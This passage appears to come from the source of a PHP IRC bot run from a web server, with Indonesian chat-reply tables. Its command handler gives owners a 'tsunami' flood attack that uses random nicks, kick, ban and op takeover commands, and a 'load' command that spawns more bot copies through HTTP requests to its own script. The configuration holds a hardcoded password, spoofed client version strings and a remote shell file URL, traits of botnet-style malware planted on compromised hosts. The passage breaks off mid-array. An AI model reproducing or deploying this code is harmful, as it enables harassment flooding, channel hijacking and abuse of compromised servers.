         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':adduser' && $com[4] && $com[4]!=$nick && $com[5]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($com[5]=="master" || $com[5]=="user") {
                 $auth["$com[4]"]["name"] = $com[4];
                 $auth["$com[4]"]["status"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :You`re Now Known As My '.$com[5].' Added By '.$dNick.' Now Type: pass <your pass> To Set Your Pass ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> <master/user> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if (!$auth["$com[4]"]) {
                 if ($com[5]=="user") {
                   $auth["$com[4]"]["name"] = $com[4];
                   $auth["$com[4]"]["status"] = $com[5];
                   fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                   fputs($fp,'NOTICE ' . $com[4] . ' :You`re Now Known As My '.$com[5].' Added By '.$dNick.' Now Type: pass <your pass> To Set Your Pass ' . CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: adduser <nick> user ' . CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :User Already Exist! Aborting AddUser! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deluser' && $com[4]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($auth["$com[4]"]["status"]=="master" || $auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: deluser <nick> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if ($auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: deluser <nick> ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"]) {
           if (ereg(":`",$com[3]) || ereg(":!",$com[3])) {
             $chan = strstr($dCommand,"#");
             $anick = str_replace("PRIVMSG ","",$dCommand);
             if ($com[3]==':!auth') {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'NOTICE '.$dNick.' :koen admin mataneh! ' . CRL);
               }
               else {
                 $whois = $dNick;
                 fputs($fp,'WHOIS '.$dNick . CRL);
               }
             }
             elseif ($com[3]==':`auth' && $chan) {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'PRIVMSG '.$chan.' :Siap '.$dNick.' ! ' . CRL);
               }
               else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.' NOT Authorized! ' . CRL); }
             }
             elseif ($auth["$dNick"]["auth"]==2) {
               if ($com[3]==':`say' && $com[4] && $chan) {
                 $msg = strstr($data,":`say");
                 $msg = str_replace(":`say ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :'.$msg. CRL);
               }
               elseif ($com[3]==':`act' && $com[4] && $chan) {
                 $msg = strstr($data,":`act");
                 $msg = str_replace(":`act ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION '.$msg.''. CRL);
               }
               elseif ($com[3]==':`slap' && $com[4] && $chan) {
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION slaps '.$com[4].' '.$com[4].' '.$com[4].' '.$com[4].' '.$com[4].' '.$com[4].' xixixixixixi'. CRL);
               }
               elseif ($com[3]==':`msg' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`msg");
                 $msg = str_replace(":`msg $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':`notice' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`notice");
                 $msg = str_replace(":`notice $com[4] ","",$msg);
                 fputs($fp,'NOTICE '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':`ctcp' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`ctcp");
                 $msg = str_replace(":`ctcp $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.''. CRL);
               }
               elseif ($com[3]==':`info' && $auth["$dNick"]["status"]=="Admin") {
                 $bhost = $_SERVER['HTTP_HOST'];
                 $bip = $_SERVER['SERVER_ADDR'];
                 $bphp  = $_SERVER['PHP_SELF'];
                 $brip = $_SERVER['REMOTE_ADDR'];
                 $brport = $_SERVER['REMOTE_PORT'];
                 fputs($fp,"NOTICE $dNick :Host: $bhost | Script: $bphp | IP: $bip | Your IP: $brip Port:$brport" . CRL);
               }
               elseif ($com[3]==':`up' && $chan) {
                 fputs($fp, 'PRIVMSG chanserv :op '.$chan.' '.$nick . CRL);
               }
               elseif ($com[3]==':`down' && $chan) {
                 fputs($fp, 'MODE '.$chan.' +v-o '.$nick.' '.$nick . CRL);
               }
               elseif ($com[3]==':`tsunami' && $com[4] && $auth["$dNick"]["status"]!="user") {
                 $nicktsu = $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                    $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1)- 1)].
                    $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                    $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)];
                 fputs($fp, 'NICK '.$nicktsu . CRL);
                 if (substr($dCommand,0,3)=='433') {
                   $nicktsu = $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                   $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                   $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                   $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)];
                   fputs($fp, 'NICK '.$nicktsu . CRL);
                 }
                 $msg = strstr($data,":`tsunami");
                 $msg = str_replace(":`tsunami $com[4]","",$msg);
                 if (ereg("#", $com[4])) {
                   fputs($fp, 'JOIN '.$com[4] . CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' :TSUNAMI'.$msg.$tsumsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'PART '.$com[4].' :F1n15h3d w1th 400x4 ch4rz' . CRL);
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
                 else {
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' :TSUNAMI'.$msg.$tsumsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :TSUNAMI'.$msg.$tsumsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
               }
               elseif ($com[3]==':`cycle' && $chan && $auth["$dNick"]["status"]!="user") {
                 $msg = strstr($data,":`cycle");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":`cycle $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":`cycle","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 fputs($fp, 'JOIN '.$partchan . CRL);
               }
               elseif ($com[3]==':`part' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`part");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":`part $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":`part","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 $remchan = strtolower($partchan);
                 if (in_array($remchan, $channel)) {
                   $channels = str_replace("$remchan ","",$channels);
                   unset($channel);
                   $channel = explode(" ", $channels);
                 }
                 foreach ($channel as $v) {
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               elseif ($com[3]==':`join' && $com[4] && $auth["$dNick"]["status"]=="Admin") {
                 if (!ereg("#",$com[4])) { $com[4]="#".$com[4]; }
                 $addchan = strtolower($com[4]);
                 if (!in_array($addchan, $channel)) {
                   $channel[]=$addchan;
                   $channels.="$addchan ";
                 }
                 foreach ($channel as $v) {
                   sleep(rand(1,6));
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               elseif ($com[3]==':`botnick' && $com[4] && !$chan && $auth["$dNick"]["status"]=="Admin") {
                 $nick = $com[4];
                 $identify = $com[5];
                 fputs($fp, 'NICK '.$nick . CRL);
                 fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
               }
               elseif ($com[3]==':`k' && $com[4] && $chan) {
                 $msg = strstr($data,":`k");
                 $msg = str_replace(":`k $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
               }
               elseif ($com[3]==':`kb' && $com[4] && $chan) {
                 $msg = strstr($data,":`kb");
                 $msg = str_replace(":`kb $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
                 fputs($fp, 'MODE '.$chan.' +b '.$com[4] . CRL);
               }
               elseif ($com[3]==':`changenick') {
                 $nick = $nicky[rand(0,count($nicky) - 1)];
                 fputs($fp, 'NICK '.$nick . CRL);
                 if (substr($dCommand,0,3)=='433') {
                   $nick = $nicky[rand(0,count($nicky) - 1)];
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
               }
               elseif ($com[3]==':`op' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +ooo '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`deop' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -o+v-oo '.$opnick.' '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`v' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`dv' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`awaymsg' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`awaymsg");
                 $msg = str_replace(":`awaymsg","",$msg);
                 if (strlen($msg)<3) {
                   $raway="on";
                   fputs($fp,'AWAY : ' . 'AWAY' . CRL);
                 }
                 else {
                   $raway="off";
                   fputs($fp,'AWAY : ' . $msg . CRL);
                 }
               }
               elseif ($com[3]==':`mode' && $com[4] && $chan) {
                 fputs($fp, 'MODE '.$chan.' :'.$com[4].' '.$com[5] . CRL);
               }
               elseif ($com[3]==':`nickmode' && $com[4]) {
                 $nickmode = $com[4];
                 fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL);
               }
               elseif ($com[3]==':`chanlist') {
                 fputs($fp, 'NOTICE '.$dNick.' :Channel List: '.$channels . CRL);
               }
               elseif ($com[3]==':`userlist') {
                 $userlist="";
                 foreach ($auth as $user) {
                   if ($user["pass"]) { $pass="-pass ok"; }
                   else { $pass="-no pass"; }
                   $userlist .= $user["name"].'('.$user["status"].$pass.') ';
                 }
                 fputs($fp, 'NOTICE '.$dNick.' :User List: '.$userlist . CRL);
               }
               elseif ($com[3]==':`quit' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`quit");
                 $msg = str_replace(":`quit","",$msg);
                 if (strlen($msg)>3) {
                   $msg = str_replace(" ","_",$msg);
                 }
                 $quitmsg = $quitmsglist[rand(0,count($quitmsglist) - 1)];
                 fputs($fp, 'QUIT ' . $quitmsg . CRL);
                 $keluar = 1;
                 exit;
               }
               elseif ($com[3]==':`vhost' && $auth["$dNick"]["status"]=="Admin") {
                 if ($com[4]) { $localhost = $com[4]; }
                 else { $localhost = 'localhost'; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti VHOST' . CRL);
               }
               elseif ($com[3]==':`jump' && $auth["$dNick"]["status"]=="Admin") {
                 if (empty($com[4])) {
                   $remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
                 }
                 else { $remotehost = $com[4]; }
                 $keluar = 0;
                 fputs($fp, "QUIT Ganti Server".CRL);
               }
               elseif ($com[3]==':`ident' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $username = $username; }
                 else { $username = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Ident ' . CRL);
               }
               elseif ($com[3]==':`fullname' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $realname = "--"; }
                 else { $realname = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Nama' . CRL);
               }
               elseif ($com[3]==':`topic' && $com[4] && $chan) {
                 $msg = strstr($data,":`topic");
                 $msg = str_replace(":`topic ","",$msg);
                 fputs($fp, 'TOPIC '.$chan.' :'.$msg . CRL);
               }
               elseif ($com[3]==':`load') {
                 if ($auth["$dNick"]["status"]=="Admin") {
                   $bhost = $_SERVER['HTTP_HOST'];
                   $bruri = $_SERVER['REQUEST_URI'];
                   if ($com[4]) { $jmlbot = $com[4]; }
                   else { $jmlbot = 1; }
                   for ($i=1;$i<=$com[4];$i++) {
                     $soket = fsockopen($bhost,80,$errno,$errstr,10);
                     fputs($soket,"GET $bruri HTTP/1.0\r\nHost: $bhost\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n");
                     fclose($soket);
                   }
                   fputs($fp,"NOTICE $dNick :".$com[4]." Bot(s) loaded!".CRL);
                 }
               }
               elseif ($com[3]==':!help' && !$chan) {
                 fputs($fp,'PRIVMSG '.$dNick.' :hehehehe.. helpnya gak ada bos!' . CRL);
               }
             }
           }
         }
         elseif (!$auth["$dNick"] && !eregi("auth",$iText)) {
           if (eregi("www.",$iText) || eregi("http:",$iText) || eregi("join #",$iText)) {
             if (!ereg("#",$dCommand)) {
               if ($log=="on") {
                 fputs($fp,'PRIVMSG '. $admin .' :4inviter: ' . $dFrom . '2:' .$iText. CRL);
               }
               $inv = strstr($dFrom,'@');
               foreach ($auth as $user) {
                 if ($user["status"]=="user") {
                   fputs($fp, 'NOTICE '.$user["name"].' :KB '.$chan.' '.$dNick.' '.$inv.'' . CRL);
                 }
               }
             }
           }
           elseif (!ereg("#",$dCommand)) {
             if ($log=="on") {
               fputs($fp,'PRIVMSG '.$admin.' :6' . $dFrom . '12:' .$iText. CRL);
             }
           }
         }
       }
     }
     elseif (substr($data,0,4) == 'PING') {
       fputs($fp,'PONG ' . substr($data,5) . CRL);
     }
   }
 }
 fclose($fp);
} while ($keluar == 0);
}

rx();






#######################
set_time_limit(0);
define ('CRLF', "\r\n");
$modbot=new module_bot;
#######################
$servban=array("irc.indoforum.org","irc.myquran.com","irc.telkom.net.id");
#################### [ CONFIG BOT ] #######################
$servpassbota=array("1","2","3","4","5","6","7","8","9");
$servpassbotb=array("0","1","2","3","4","5","6","7","8","9");
$servpassbot=$servpassbota[rand(0,count($servpassbota) - 1)].$servpassbotb[rand(0,count($servpassbotb) - 1)];
$bot['admin']="BArNEr";
$bot['pass']="sempakz";
$bot['inick']="LAuT|";
$bot['pnick']="|Vhe";
$bot['basechan']="#LAUT";
$bot['roomnet']="#KEBAKKRAMAT";
$bot['roomkey']="ok";
$bot['local']="localhost";
$bot['server']=$servban[rand(0,count($servban) - 1)];
$bot['port']=6667;
$bot['userver']=0;
$bot['pserver']=$servpassbot;
/////////////////////////////////////
$bot['nick']=$modbot->rnd_nick();
$bot['ident']="bot";
$bot['realname']="Gallery";

################# [ END CONFIG BOT ] ######################
#################### [ AUTH VAR ] #########################
$Admin=strtolower($bot['admin']);
$BOT_PASSWORD=strtolower($bot['pass']);
$auth = array($Admin => array("name" => $Admin, "pass" => $BOT_PASSWORD, "auth" => 1,"status" => "Owner","ident"=>"","host"=>"","time",""));
################## [ END AUTH VAR ] #######################
$versbot=array("nerakaIRC vRVF beta version by Blockhermaaf kena flood ringan ^_^",
               "Xirc v1.0 on (Nokia6101/04.10 )",
               "JedIrc v3.2.1 on (Nokia6275i/2005_w21_pb_)",
               "MACHO-Irc v0.35 by Macho crew (Anak_kadal) on...........Ma`af perangkat anda tidak bisa mendeteksi perangkat lain.....!!!!!!!!(ERROR READING HARDWARE)",
               "mIRC v6.21 Khaled Mardam-Bey",
               "ga pernah ngeliat kalkulator bisa di pake buat chat ya??? --",
               "KulupanIRc v1.01a by danoxyde on ASUS P5LD2-X/1333 with Intel Core 2 Duo E4500 @2.20 Ghz",
               "Xirc v1.0 on (NokiaN70-1/5.0737.3.0.1 )",
               "nerakaIRC v0.2 version beta by Blockher onkalkulator casio fx-900 plus (http://blockher.peperonity.com/)",
               "JmIrc-G v.4.1 by puy`Yank on Nokia 2626i Up-grade Edition 8GB with LCD flat 29",
               "JedIrc v3.2.1 on (SonyEricssonW300i/R4EA031)",
               "eggdrop v1.6.18",
               "FeeLCoMz AI PHPBot Script By CrutZ di DaDa..",
               "JedIrc v3.2 on (Nokia2600c-2/05.61)",
               "mIRC v6.35 Khaled Mardam-Bey",
               "IRCQ dewek by GUE! (JO INCENG2 AKU RA SEMPAKAN COK)",
               "jmIrc-m v0.34a by Archangel on j2me");
$pingsiapa="";

###################### [ VAR VAR ] ########################
$tsu=array("m","z","p","t","r","x","w","f","h","k","q","c","L");
$nbota=array("1","2","3","4","5","6","7","8","9","0");
$nbotb=array("1","2","3","4","5","6","7","8","9","0");
$zodiak = array("capricorn", "aquarius", "pisces", "aries", "taurus", "gemini", "cancer", "leo", "virgo", "libra", "scorpio", "sagitarius");
$nbotna=$nbota[rand(0,count($nbota) - 1)];
$nbotnb=$nbota[rand(0,count($nbota) - 1)];
$nbot=$nbotna.$nbotnb;
$shellq="";
$floddban="ON";$GuardV="ON";
$ctcpversi=$versbot[rand(0,count($versbot) - 1)];
$ctcpfinger="11Loaded 4by 12[11KaNKeR12]";
$user_chan_arr[][]="";
$notarget=0;
$greetmsg["nick"]["nama"]="";
$greetmsg["nick"]["msg"]="";

$banlist[$bot['basechan']]="";
$ping["ping"]["nick"]="";
$ping["ping"]["chan"]="";

$jmlspoof["irc.ads.net.id"]=0;
$isisp[1]["irc.ads.net.id"]["ident"]="gw";
$isisp[1]["irc.ads.net.id"]["spoof"]="hantu.rese.a.biz";
$isisp[1]["irc.ads.net.id"]["pass"]="spoof1";

$kmusedan[0]["contoh"][]="";
$kmusedan[0]["definisi"][]="";
$kmusedan[0]["kata"][]="";
$kmjml["apa"]="";

$chanson=strtolower($bot['basechan']);
$listison[0]=strtolower($bot['admin']);
$ada1[$listison[0]]=false;
$ada2[$listison[0]]=true;

$goboom=0;$tmboom=0;$onboom="off";$targetboom="";$warnabenar="";$bw[0]="";$chanboom="";$timeboom=30;
$warnaboom="Merah;Kuning;Hijau;Ungu;Coklat;Hitam;Putih;Abu-abu;Emas;Silver;Maroon;Jingga;Orange";
$txttepmp='';$textemp='';$txttepmx='';$temptex='';
$textrep=0;$Maxreep=2;$maxkar=200;
$systembot['ping'][strtolower($bot['basechan'])]="4OFF";
$systembot['NGOMONG'][strtolower($bot['basechan'])]=="4OFF";
$clista='logi';$textemp='';
$asalseen['KaNKeR']=date("l, j F Y H:i:s");$asalseen['basechanchanel']='#groundthalo';$asalseen['statusJh0Ns']="minggat";
$shellacak=array("http://ANAKBEGO.net/gila.txt??");
$shellgue=$shellacak[rand(0,count($shellacak) - 1)];
$iscy=time();
$timercy=2000;
$timermsg=2000;
$timeract=2000;
#################### [ END VAR VAR ] ######################
#################### [ CREWET ] ######################
$wbmsg = array(
"Selamat Datang <nick>",
"Wew.. <nick> pa kabar?",
"Baru online ya <nick>?",
"Met datang di chanel <chan>, <nick>",
"wuich.. <nick> baru bangun tidur ngana staw? pigi cuci muka dulu uwte..",
"Weeebbeeeeeeeeeehhh <nick>!",
"<nick> dah mandi blom?",
"baru join ya <nick>?",
"<nick>, tadi ada yg cari..banyk utang nga staw?",
"<nick>, kemana aja?",
"ngapain aja barusan <nick>?",
"<nick> dah makan blom?",
"hmm.. <nick> udah mulai beraksi ne kayaknya",
"kamu baik deh <nick>",
"<nick>, kamu cuakep deh.. kayak mas sibego ;)",
"aku seneng liat <nick>.. orgnya ramah, baik, cakep lagi.",
"mantap ngana pe nick <nick>..",
"<nick>, senyummu bikin hatiku berdebar.. aw aw aw",
"Ew.. so lunas nga pe utang di warnet <nick>..?",
"awas., <nick> ni yg pernah jatuh cinta sama Founder",
"Wellcome back <nick>",
"wah.. dimana-mana ada <nick>",
"sibego kabar boskuu umuachhh <nick>?",
"dah maem blom <nick>?",
"Asyiik.. <nick>  so datang",
"<nick>, kenalin gw $namaku.. klo mau di PV saja wea.. :P~",
"Waduwh, <nick> knapa baru join?",
"wah.. <nick> td dicari locop tuh, katanya abis ba loco..",
"tolooong.. <nick> nyari aku sampai ke <chan> mo sruh goso staw..",
"chan <chan> jd rame klo ada si <nick>",
"btw, <nick> udah kul apa masih skul?",
"wb <nick>, nak mana dnk..?",
"woy ngoni so knal pa sibego <nick>, to.?",
"<nick> blom ngantuk kw sayang.?",
"leh nalan ga <nick>?",
"hihi,, <nick> lucu deh.. wkwkwkwk.. ",
);

$jawabsapa = array(
"ada apa <nick> tayaank?",
"iya <nick> sayang",
"Longola <nick>!",
"Beugh.. <nick> kuad ba pangge ikz..",
"males ah <nick>.. lamu ",
"nde sbantar jow <nick> sygQww",
"mo suka apa <nick> sayang.?",
"ikz.. <nick> ni mo suruh goso staw..",
"so knapa nga ini <nick>",
"<nick> jangan maniso akh",
"beugh <nick> jgn banyk mulu akhh",
"hmm.. <nick> apa yg nga rasa2 ini.?",
"ew.. <nick> knapa monyu lio",
"capee dech.. <nick>",
"huzz.. diam <nick>",
"sebel ah <nick>",
"<nick> ba diam ksana jow hu`u",
"$namaku lg mlas ngobrol dg <nick>",
"Eaxeaxea.. <nick> kangen yach?",
"Wuich.. <nick> ini cerewet ahm..",
);

$rmales = "lg males nih <nick>..";
$rmau = "aku mau koq <nick>!";
$rsanggup = "bisa kok <nick>";
$rboleh = "boleh kok <nick>";
$rsetuju = "iya <nick>";
$rthx = "makacih <nick>..";
$rbingung = "hmm..$namaku ga tau jg nih <nick>..";
$rgenit = "ich.. <nick> genit";

$respon_umum = array(
array("sepi","iya nih <nick> ramein donk.."),
array("sibego","<nick> kiapa pangge-pagge kita pe bos..."),
array("butul","ah..!! <nick> jang ba akal kau"),
array("sunyi","<nick> kase rame noch, jgn cm diam"),
array("lucu","pelawak staw.."),
array("brb","ok <nick> jangan ba lama2 kawan...!!"),
array("lapar","kasiang te <nick> ba mati jo... wkwkwk"),
array("pamit","ok.. <nick>, ati2 ya.. thathaaaw.."),
array("pamet","knapa <nick>, so malas online..?"),
array("pamed","seep <nick>, jgn lupa sun buat mas sibego"),
array("pamid","aduh.. <nick> spay dulu pa Boss sibego, baru pamit ^_^"),
array("ngantuk","<nick> pi tidor klo so mnganto Luje"),
array("asalam","Wa'alaikumsalam <nick>"),
array("Vhe","woww mana dia..?..i2 kan pacar tercyang boz aQ sibego :P <nick>"),
array("sore","sore olo dech <nick>"),
array("malam","malam olo dech <nick>"),
array("siang","siang olo dech <nick>"),
array("mandi","BRB.. ngintip <nick> mandi.. wkakakaka :P~"),
);

$respon_pesan = array(
//Sapaan
array("hai ","hai jg <nick>"),
array("halo ","halo jg <nick>"),
array("alow","alow jg <nick>"),
array("kabar","baik, km gmn <nick>?"),
array("kbr","baik, km gmn <nick>?"),
array("nalin","hai.. aku $namaku"),
array("nalkan","hai.. aku $namaku"),
array("nalan","boleh koq <nick>.. u 1st"),
//JECK
array("asl","<nick>, aku $aslku"),
array("umur","<nick>, klo aq $aslku"),
array("nama","<nick>, aku $namaku .. u?"),
array("skul","yup <nick>, aku skul."),
array("kul","<nick>, aku ga kul neh.."),
array("alamat","weleeehh.. rahasia donk <nick>.."),
array("nak mana","aQ $aslku <nick>"),
array("tinggal","<nick>, aku di rumah"),
array("cowo","blom, klo <nick> gmn?"),
array("pcr","blom, hihi.. klo <nick>?"),
array("pacaran","emangnya <nick> mau ya pacaran ma $namaku?"),
array("pacar ","blom, <nick> ndiri gmn?"),
//Ajakan
array("pv","$rmales"),
array("ngomong","ngomong ttg apa <nick>?"),
array("curhat","mangnya mo curhat masalah apa <nick>?"),
array("nikah ","udah klo boz sibego..nikah ama vhebry tuh..boz aku <nick>"),
array("kawin ","udah klo boz sibego..kawin ama vhebry tuh.."),
array("kencan","boleh <nick>, kpn neh kencannya?"),
array("besok","boleh <nick>.."),
array("mau ","$rmau"),
//Tuduhan
array("bohong","bohong? ngpn Q bohong.. <nick> kali yg bohong..hehehe"),
array("boong","boong? <nick> tuh yg boong.."),
array("males","yaa.. lagi males aja nih <nick>"),
array("lain","yg lain gmn <nick>?"),
array("laen","yg laen gmn <nick>?"),
array("GR ","<nick> tuh yg ke-GR-an.."),
array("nyambung","<nick>nya aja yg ga nyambung.. xixixi"),
array(" aneh","aneh gmn <nick>?"),
//Kegiatan
array("mandi","klo aku udah mandi <nick>"),
array("makan","udah koq <nick>, klo <nick>?"),
array("maem","udah koq <nick>, klo <nick>?"),
array("mkn","udah neh, klo <nick>?"),
array("belanja","belanja dmn <nick>?"),
array("bobo ","$rmales"),
array("tidur ","$rmales"),
array("ngantuk ","blom neh <nick>.. xixi"),
array("ngpn","lg chat aja neh <nick>"),
array("ngapa","lg chat aja neh <nick>"),
//Pertanyaan
array("salam kenal ","salam kenal jg <nick>"),
array("kenal ","$namaku ga kenal tuh.. xixi"),
array("tau ","$namaku ga tau tuh.. xixi"),
array("napa","aq ga knp2 koq <nick>"),
array("knp","aq ga knp2 koq <nick>"),
array("kemana","disini aja tuh <nick>"),
array("lupa","aq ga lupa koq <nick>"),
array(" mana ","$rbingung"),
array("gimana","hmm.. gimana yach ? kikikiki.."),
//Persetujuan
array("maaf","$rsetuju"),
//Mood
array("cinta","ih.. <nick> gombal deh.."),
array("love","I love u too, <nick>"),
array("jodoh","jodoh kalee <nick>"),
array("kangen","aku jg kangen km, <nick>"),
array("muach","muach <nick>.."),
array("uaach","idih, <nick> ga malu apa cium2 aku didepan umum.."),
array("kiss","mo permen kiss ya <nick>?"),
array("cium","$rgenit"),
array("eluk ","$rgenit"),
array("elonin","jgn donk <nick>, kan malu.."),
//Additional
array("hihihi","kok <nick> ngetawain aku seh?"),
array("xixi","ngetawain aku y <nick>?"),
array("slap","beugh.. <nick>.! saki Luje.. Qt mo bilang pa JECK ngn.?"),
array("pokes","beugh.. <nick> ba slaps pura2 tdk tauh akhh :P~"),
);

$pujianlist = array("cantik","baik","baek","cakep","ramah","pengertian","hebat",
"bagus","indah","jujur");

$cacianlist = array("bego","jelek","jelex","gendeng","edan","gilo","gila",
"sinting","dudul","dodol","jahat","goblok","geblek","sialan"," bau","stres");

$warnalist = array("2","3","4","5","7","8","9","10","11","12","13","1,1","1,2","1,2","1,4","1,5","1,6","1,7","1,8","1,9","1,10","1,11","1,12","1,13","1,14","1,15",
"2,1 ","2,2 ","2,2 ","2,4 ","2,5 ","2,6 ","2,7 ","2,8 ","2,9 ","2,10 ","2,11 ","2,12 ","2,13 ","2,14","2,15",
